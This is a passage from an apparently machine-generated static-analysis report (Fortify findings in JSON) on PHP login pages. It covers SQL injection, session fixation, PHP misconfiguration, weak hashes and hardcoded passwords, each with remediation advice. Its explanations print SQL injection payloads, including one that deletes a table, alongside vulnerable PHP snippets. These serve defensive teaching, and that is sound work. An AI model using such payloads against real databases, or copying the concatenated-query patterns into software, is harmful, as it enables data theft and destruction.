            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4403/?engineType=SCA&issue=1A0C1BCB04833B21F1E93780B9FB7F02"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4396",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 33 of login.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4396/?engineType=SCA&issue=16947C885431CB88EF8A2A624935F820"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4602",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 40 of login.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in login.php on line 40.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4602/?engineType=SCA&issue=96E5B38B6882141BD86B1FB8C12A4C1A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4709",
          "shortDescription" : {
            "text" : "Session Fixation"
          },
          "fullDescription" : {
            "text" : "Authenticating a user without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions. \n\n\n"
          },
          "help" : {
            "text" : "Session fixation vulnerabilities occur when:\n\n1. A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.\n\n2. An attacker is able to force a known session identifier on a user so that, after the user authenticates, the attacker has access to the authenticated session.\n\nIn the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to authenticate against the server using that session identifier, giving the attacker access to the user's account through the active session.\n\n\nIn this case, the session.use_strict_mode property is set to 0 or off in php.ini or is not set in which case it is disabled by default.\n\n\nExample 1: The following code disables the use_strict_mode attribute for session cookies.\n\nsession.use_strict_mode=0\n\n    \n\nIn order to prevent session fixation, a web-based application must issue a new session identifier at the same time it authenticates a user. Many application servers make this more difficult by providing separate facilities for managing authorization and session management.\n\nEnable the use_strict_mode attribute when creating session cookies. You can do this by setting the session.use_strict_mode property to 1 or on in your PHP configuration file.\n\nExample 2: The following code enables the use_strict_mode attribute for session cookies.\n    \n    session.use_strict_mode=1\n    \n\nThe only effective solution is to implement proprietary code to perform authentication and ensure that you invalidate an existing session before processing login requests. Any existing user information stored in the session can be migrated to the new session safely, as long as the associated session identifier changes. Keep in mind that the order of operations is important: the existing session must be invalidated before the login request is processed. If the session is invalidated after the user is logged in, a race condition exists where the attacker knows the session identifier for some period after authentication.\n    \n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4709/?engineType=SCA&issue=E297AEC4E0B79C75D421DE8053E1A186"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4762",
          "shortDescription" : {
            "text" : "PHP Misconfiguration: allow_url_fopen Enabled"
          },
          "fullDescription" : {
            "text" : "Operating on remote files can allow an attacker to inject malicious content into the program.\n\n\n"
          },
          "help" : {
            "text" : "When enabled, the allow_url_fopen option allows PHP functions that accept a filename to operate on remote files using an HTTP or FTP URL. The option, which was introduced in PHP 4.0.4 and is enabled by default, is dangerous because it can allow attackers to introduce malicious content into an application. At best, operating on remote files leaves the application susceptible to attackers who alter the remote file to include malicious content. At worst, if attackers can control a URL that the application operates on, then they can inject arbitrary malicious content into the application by supplying a URL to a remote server.\n\nExample 1: The following code opens a file whose name is controlled by a request parameter and reads its contents. Because the value of $file is controlled by a request parameter, an attacker could violate the programmer's assumptions by providing a URL to a remote file.\n\n\n&lt;?php\n$file = fopen ($_GET[\"file\"], \"r\");\nif (!$file) {\n    // handle errors\n}\nwhile (!feof ($file)) {\n    $line = fgets ($file, 1024);\n    // operate on file content\n}\nfclose($file);\n?&gt;\n\n\nDo not allow arbitrary file system functions to access remote files. Instead, use the cURL functions from libcurl to grant access to remote files explicitly when necessary.\n\nExample 2: The following entry in php.ini disables the allow_url_fopen option:\n\n\nallow_url_fopen = 'off'\n\n\nThe allow_url_fopen can also be disabled by including the following entry in the Apache httpd.conf file:\n\n\nphp_flag  allow_url_fopen  off\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4762/?engineType=SCA&issue=FE935BB692F5FF2A7BFBE8064F7EE1B2"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4364",
          "shortDescription" : {
            "text" : "PHP Misconfiguration: allow_url_include Enabled"
          },
          "fullDescription" : {
            "text" : "Include statements that refer to remote files can allow an attacker to inject malicious content into the program.\n\n\n"
          },
          "help" : {
            "text" : "When enabled, the allow_url_include option allows PHP functions that specify a file for inclusion in the current page, such as include() and require(), to accept an HTTP or FTP URL to a remote file. The option, which was introduced in PHP 5.2.0 and is disabled by default, is dangerous because it can allow attackers to introduce malicious content into an application. At best, including remote files leaves the application susceptible to attackers who alter the remote file to include malicious content. At worst, if attackers can control a URL that the application uses to specify the remote file to include, then they can inject arbitrary malicious content into the application by supplying a URL to a remote server.\n\nWhen enabled, the allow_url_include option allows PHP functions that specify a file for inclusion in the current page, such as include() and require(), to accept an HTTP or FTP URL to a remote file. The option, which was introduced in PHP 5.2.0 and is disabled by default, is dangerous because it can allow attackers to introduce malicious content into an application. At best, including remote files leaves the application susceptible to attackers who alter the remote file to include malicious content. At worst, if attackers can control a URL that the application uses to specify the remote file to include, then they can inject arbitrary malicious content into the application by supplying a URL to a remote server.\n\nrecommendations:\n\nDo not allow remote include statements. The following entry in php.ini disables the allow_url_include option:\n\n\nallow_url_include = 'off'\n\n\nThe allow_url_include option can also be disabled by including the following entry the Apache httpd.conf file:\n\n\nphp_flag  allow_url_include  off\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4364/?engineType=SCA&issue=017C84D60260B644B13656B36B02353C"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4675",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in phpinfo.php with a call to phpinfo() on line 8. The information revealed by phpinfo() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4675/?engineType=SCA&issue=C814080A4DC5D70B3FF32F428B7D4F5C"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4580",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in high.php on line 12.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4580/?engineType=SCA&issue=8B81E8D8FAB7C7740633A97B5F93BD25"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4560",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4560/?engineType=SCA&issue=7A511DBD8504209D24010638124F38BE"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4397",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 20 of high.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in high.php on line 20.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4397/?engineType=SCA&issue=17F62E7DC7DE4902CCE25ADDD57AF2CF"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4752",
          "shortDescription" : {
            "text" : "Insecure Randomness"
          },
          "fullDescription" : {
            "text" : "The random number generator implemented by rand() cannot withstand a cryptographic attack.\n\n\n"
          },
          "help" : {
            "text" : "Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in a security-sensitive context.\n\nIn this case, the function that generates weak random numbers is rand() in high.php on line 33.\n\nComputers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.\n\nThere are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and form an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between the generated random value and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.\n\nExample: The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.\n\n\n  function genReceiptURL($baseURL) {\n    $randNum = rand();\n    $receiptURL = $baseURL . $randNum . \".html\";\n    return $receiptURL;\n  }\n\n\nThis code uses the rand() function to generate \"unique\" identifiers for the receipt pages it generates. Since rand() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.\n\nWhen unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Do not use values such as the current time because it offers only negligible entropy.)\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4752/?engineType=SCA&issue=F84E39BA8D8CA62EF9A64A929242DE44"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4581",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 12.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4581/?engineType=SCA&issue=8B81E8D8FAB7C7740633A97B5F93BD26"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4547",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
